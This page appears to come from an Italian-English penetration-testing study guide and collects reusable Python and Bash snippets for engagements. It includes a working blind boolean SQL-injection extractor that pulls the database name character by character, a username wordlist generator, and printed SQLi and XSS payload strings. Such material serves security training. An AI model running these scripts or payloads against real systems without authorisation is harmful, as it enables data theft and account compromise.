# Scripting Snippets

**Difficoltà:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [Command-Line-Tools.md](Command-Line-Tools.md)
**Lab:** riferimento trasversale

---

## Obiettivo

Certe cose (estrarre un dato carattere per carattere con una blind SQLi, generare varianti di username da una lista di nomi, mandare cento richieste e leggerne solo lo status code) non hanno senso farle a mano due volte. Qui trovi gli snippet Python/Bash che riusi engagement dopo engagement: li adatti al target del momento invece di riscriverli da zero.

---

## Python: richiesta HTTP base con requests

```python
import requests

s = requests.Session()
r = s.get("http://target.com/", headers={"User-Agent": "Mozilla/5.0"})
print(r.status_code, len(r.text))
```

## Python: template estrazione blind boolean (ricerca binaria)

```python
import requests

def extract_char(url, param, position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1' AND ASCII(SUBSTRING((SELECT database()),{position},1))>{mid} --"
        r = requests.get(url, params={param: payload})
        if "Welcome" in r.text:
            low = mid + 1
        else:
            high = mid
    return chr(low) if low > 32 else None
```

## Python: generatore wordlist username da nomi

```python
names = ["Mario Rossi", "Anna Bianchi"]
for n in names:
    first, last = n.lower().split()
    print(f"{first}.{last}")
    print(f"{first[0]}{last}")
    print(f"{last}.{first}")
```

## Bash: batch requests con controllo status code

```bash
while read -r url; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  echo "$code $url"
done < urls.txt
```

## Bash: funzione riutilizzabile per URL-encode

```bash
urlencode() {
  python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
}
urlencode "<script>alert(1)</script>"
```

## Python: generatore payload SQLi/XSS su lista di encoding

```python
payload_base = "' OR 1=1 --"
encodings = {
    "raw": payload_base,
    "url": __import__("urllib.parse", fromlist=["quote"]).quote(payload_base),
}
for name, p in encodings.items():
    print(name, p)
```

---

## Connessioni

- **Prerequisito:** [Command-Line-Tools.md](Command-Line-Tools.md)
- **Combinazione con:** [04-SQL-Injection/04-Blind-SQLi.md](../04-SQL-Injection/04-Blind-SQLi.md)

